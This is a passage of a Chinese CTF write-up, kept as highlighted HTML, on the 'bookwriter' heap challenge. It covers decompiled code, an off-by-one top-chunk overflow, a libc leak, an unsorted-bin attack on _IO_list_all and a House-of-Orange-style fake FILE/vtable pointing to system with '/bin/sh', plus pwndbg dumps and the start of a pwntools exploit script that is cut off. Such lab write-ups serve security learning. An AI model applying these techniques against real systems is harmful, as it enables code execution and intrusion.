class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *v2; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">8</span> )</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can&#x27;t add new page anymore!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[i] )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of page :&quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  v2 = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Error !&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :&quot;</span>);</span><br><span class=\"line\">  readck((__int64)v2, size);</span><br><span class=\"line\">  (&amp;ptrlist)[i] = v2;</span><br><span class=\"line\">  sizelist[i] = size;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"info函数\"><a class=\"markdownIt-Anchor\" href=\"#info函数\">#</a> info 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">info</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index of page :&quot;</span>);</span><br><span class=\"line\">  idx = getnum();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;out of page:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Not found !&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Page #%u \\n&quot;</span>, idx);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content :\\n%s\\n&quot;</span>, (&amp;ptrlist)[idx]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"edit函数\"><a class=\"markdownIt-Anchor\" href=\"#edit函数\">#</a> edit 函数</h3>\n<figure class=\"highlight v\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> edit()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Index of page :&quot;</span>);</span><br><span class=\"line\">  v1 = getnum();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(<span class=\"string\">&quot;out of page:&quot;</span>);</span><br><span class=\"line\">    exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !(&amp;ptrlist)[v1] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Not found !&quot;</span>);</span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Content:&quot;</span>);</span><br><span class=\"line\">  readck((__int64)(&amp;ptrlist)[v1], sizelist[v1]);</span><br><span class=\"line\">  sizelist[v1] = strlen((&amp;ptrlist)[v1]);        <span class=\"comment\">// 更新size，但是，readck不会加设空结尾，不对齐输入，可以造成溢出1字节</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里虽然会更新 size，但是如果我们读入的 text，刚好填充 chunk 的用户区，但是结尾不是’\\x00’，更新长度的时候，会把下一个堆块的 size 算进去。造成溢出，如果是 topchunk_size 溢出会更多</p>\n<h3 id=\"updatename函数\"><a class=\"markdownIt-Anchor\" href=\"#updatename函数\">#</a> updatename 函数</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">updatename</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Author : %s\\n&quot;</span>, auther);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Page : %u\\n&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)count);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Do you want to change the author ? (yes:1 / no:0) &quot;</span>);</span><br><span class=\"line\">  _isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    readnum();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h2>\n<p>程序的一的大漏洞就是对于输入的字符串只会检查换行符，而不会见擦汗输入是否有结束符，输入 name 的时候，党字符串长度为 64 时，就会接上 gptr, 导致堆地址泄露。</p>\n<p>程序没有 free，如何泄露 libc？</p>\n<p>add 时，判断错误，会导致读入第九个在 sizelist 的位置，所以修改 sizelist [0] 的大小为 0，readck 允许读入为 0。导致再次 edit ptrlist [0] 时读入很大数据溢出。修改 topchunk：</p>\n<p>edit 时，对于非对齐输入，会造成溢出，将下一个堆块的 size，计入当前堆块 content 的 size，topchunk 溢出 3 字节，其他堆块溢出 1 字节。通过三字节的溢出将 topchunk 变得很小。</p>\n<p><em>updatename 的时候使用了 scnaf (&quot;% d&quot;)，这有点奇怪，因为 scanf 需要用到堆空间来处理缓存：（这里没有任何利用价值）：</em></p>\n<p>关键还是在于修改 topchunk , 党 topchunk_size 小于申请的空间大小时，会释放 topchunk 进入 unsortedbins, 这样就会造成 libc 及地址的泄露。</p>\n<p>当我们已经申请了 8 个 page，如果 size [0]==0，就可以绕过检查，额外申请出来一个 page，将地址返回写道 size [0]，那么，再次 edit ptrlist [0] 时，就可以实现溢出，（因为地址很大，足够溢出）</p>\n<p>同时，更新 comment 的长度依旧是检查空字符，所以可以使的更新后对应的 size 为 0，导致第九个指针变量为 0，可以继续申请堆块，这个可以重复利用。</p>\n<p>如此，旧的 topchunk 在 unsortedbins 里面，修改其 bk 指针，利用 unsortedbins attack 实现任意地址写大数据（main_arena+88），</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f7ba0e31540</span> &lt;_IO_2_1_stderr_&gt;</span><br><span class=\"line\"><span class=\"comment\">//payload = b&#x27;/bin/sh\\x00&#x27;+p64(0x61)+p64(main_arena)+p64(list_all-0x10)+p64(2)+p64(3)</span></span><br><span class=\"line\">pwndbg&gt; p _IO_list_all</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f7ba0e30b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面很巧妙的东西来了，我们伪造_IO_list_all 的数据为 main_arena+88, 那么原本_  _chain 指向下一个 file 结构体，结果 fakeFIlede 的 chain 就是 smallbins 的入口马志翔里面的第一个 chunk。所以我们将 unsortedbin 里面的 topchunk 的 size 变小，就会进入 smallbin，然后 fakefile_chain --&gt;topchunk，我们利用溢出将 topchunk 伪造成另一个 fakefile2，并伪造 vtable。伪造 fakefile2 要注意， flag 写入的是‘/bin/sh\\x00’ , 因为 vtable 里面的函数大多会以 flag 作为自己的参数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x7f7ba0e30b78</span>   &lt;main_arena+<span class=\"number\">88</span>&gt; <span class=\"comment\">//伪造的第一个fakefile</span></span><br><span class=\"line\">$<span class=\"number\">3</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">17100832</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x102c2c0</span> <span class=\"string\">&quot;/bin/sh&quot;</span>, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x102c2c0</span> <span class=\"string\">&quot;/bin/sh&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f7ba0e31510</span> <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x7f7ba0e30b88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;\\300\\302\\002\\001&quot;</span>, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x7f7ba0e30b88</span> &lt;main_arena+<span class=\"number\">104</span>&gt; <span class=\"string\">&quot;\\300\\302\\002\\001&quot;</span>, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x7f7ba0e30b98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x7f7ba0e30b98</span> &lt;main_arena+<span class=\"number\">120</span>&gt; <span class=\"string\">&quot;\\210\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x7f7ba0e30ba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x7f7ba0e30ba8</span> &lt;main_arena+<span class=\"number\">136</span>&gt; <span class=\"string\">&quot;\\230\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x7f7ba0e30bb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x7f7ba0e30bb8</span> &lt;main_arena+<span class=\"number\">152</span>&gt; <span class=\"string\">&quot;\\250\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x102c2c0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x102c2c0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">-1595733032</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">32635</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">140168956939224</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">3048</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">-29</span> <span class=\"string\">&#x27;\\343&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;\\240&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x7f7ba0e30be8</span> &lt;main_arena+<span class=\"number\">200</span>&gt;, </span><br><span class=\"line\">    _offset = <span class=\"number\">140168956939256</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x7f7ba0e30bf8</span> &lt;main_arena+<span class=\"number\">216</span>&gt;, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x7f7ba0e30c08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x7f7ba0e30c08</span> &lt;main_arena+<span class=\"number\">232</span>&gt;, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x7f7ba0e30c18</span> &lt;main_arena+<span class=\"number\">248</span>&gt;, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">140168956939288</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1595732952</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;&#123;\\177\\000\\000(\\f\\343\\240&#123;\\177\\000\\000\\070\\f\\343&quot;</span>...</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x7f7ba0e30c38</span> &lt;main_arena+<span class=\"number\">280</span>&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//bins</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x102c2c0</span> —▸ <span class=\"number\">0x7f7ba0e30bc8</span> (main_arena+<span class=\"number\">168</span>) ◂— <span class=\"number\">0x102c2c0</span></span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"keyword\">struct</span> _IO_FILE_plus *) <span class=\"number\">0x102c2c0</span>\t\t\t\t<span class=\"comment\">//fakefile2</span></span><br><span class=\"line\">$<span class=\"number\">4</span> = &#123;</span><br><span class=\"line\">  file = &#123;</span><br><span class=\"line\">    _flags = <span class=\"number\">1852400175</span>, </span><br><span class=\"line\">    _IO_read_ptr = <span class=\"number\">0x61</span> &lt;error: Cannot access memory at address <span class=\"number\">0x61</span>&gt;, </span><br><span class=\"line\">    _IO_read_end = <span class=\"number\">0x7f7ba0e30bc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt; <span class=\"string\">&quot;\\270\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_read_base = <span class=\"number\">0x7f7ba0e30bc8</span> &lt;main_arena+<span class=\"number\">168</span>&gt; <span class=\"string\">&quot;\\270\\v\\343\\240&#123;\\177&quot;</span>, </span><br><span class=\"line\">    _IO_write_base = <span class=\"number\">0x2</span> &lt;error: Cannot access memory at address <span class=\"number\">0x2</span>&gt;, </span><br><span class=\"line\">    _IO_write_ptr = <span class=\"number\">0x3</span> &lt;error: Cannot access memory at address <span class=\"number\">0x3</span>&gt;, </span><br><span class=\"line\">    _IO_write_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_buf_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_backup_base = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _IO_save_end = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _markers = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _chain = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _fileno = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _flags2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _old_offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _cur_column = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _vtable_offset = <span class=\"number\">0</span> <span class=\"string\">&#x27;\\000&#x27;</span>, </span><br><span class=\"line\">    _shortbuf = <span class=\"string\">&quot;&quot;</span>, </span><br><span class=\"line\">    _lock = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _offset = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _codecvt = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _wide_data = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_list = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    _freeres_buf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">    __pad5 = <span class=\"number\">0</span>, </span><br><span class=\"line\">    _mode = <span class=\"number\">-1</span>, </span><br><span class=\"line\">    _unused2 = <span class=\"string\">&quot;\\377\\377\\377\\377&quot;</span>, <span class=\"string\">&#x27;\\000&#x27;</span> &lt;repeats <span class=\"number\">15</span> times&gt;</span><br><span class=\"line\">  &#125;, </span><br><span class=\"line\">  vtable = <span class=\"number\">0x102c3a0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//伪造的vtable</span></span><br><span class=\"line\">pwndbg&gt; p *(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> _IO_jump_t *) <span class=\"number\">0x102c3a0</span></span><br><span class=\"line\">$<span class=\"number\">8</span> = &#123;</span><br><span class=\"line\">  __dummy = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __dummy2 = <span class=\"number\">0</span>, </span><br><span class=\"line\">  __finish = <span class=\"number\">0x1</span>, </span><br><span class=\"line\">  __overflow = <span class=\"number\">0x7f7ba0ab13a0</span> &lt;__libc_system&gt;, </span><br><span class=\"line\">  __underflow = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __uflow = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __pbackfail = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __xsputn = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __xsgetn = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seekoff = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seekpos = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __setbuf = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __sync = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __doallocate = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __read = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __write = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __seek = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __close = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __stat = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __showmanyc = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  __imbue = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>下面要考虑的就是如何出发伪造的 vtable。首先我们这里的 fakefile2 取代了 stdout，所以当程序报错的输出信息时，会调用 over_flow，我们在伪造的 vtable 对应位置写入 system。</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./bookwriter&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bookwriter&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">cnt = <span class=\"number\">0x602040</span></span><br><span class=\"line\">name = <span class=\"number\">0x602060</span>\t\t\t\t<span class=\"comment\">#size=64</span></span><br><span class=\"line\">gp = <span class=\"number\">0x6020A0</span>\t\t\t\t</span><br><span class=\"line\">gs = <span class=\"number\">0x6020E0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">thename</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">\tr.sendafter(<span class=\"string\">&quot;Author :&quot;</span>,text)</span><br><span 